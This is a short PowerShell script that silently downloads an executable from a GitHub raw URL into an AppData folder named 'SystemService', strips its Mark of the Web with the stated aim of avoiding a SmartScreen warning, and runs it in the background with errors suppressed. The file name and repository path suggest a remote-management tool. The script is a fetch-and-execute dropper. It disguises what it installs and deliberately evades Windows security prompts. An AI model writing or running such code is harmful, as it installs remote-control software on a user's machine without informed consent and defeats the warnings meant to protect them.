$ErrorActionPreference = 'SilentlyContinue'
$targetDir = "$env:APPDATA\SystemService"
$targetExe = "$targetDir\system-service.exe"

New-Item -ItemType Directory -Path $targetDir -Force | Out-Null

$url = "https://raw.githubusercontent.com/satyamkumar420/apps-vault/master/remote-manager/windows/system-service-windows-silent.exe"
Invoke-WebRequest -Uri $url -OutFile $targetExe -UseBasicParsing

# Strip NTFS Mark of the Web to prevent Windows SmartScreen popup
Unblock-File -Path $targetExe

# Launch silently in background
Start-Process -FilePath $targetExe
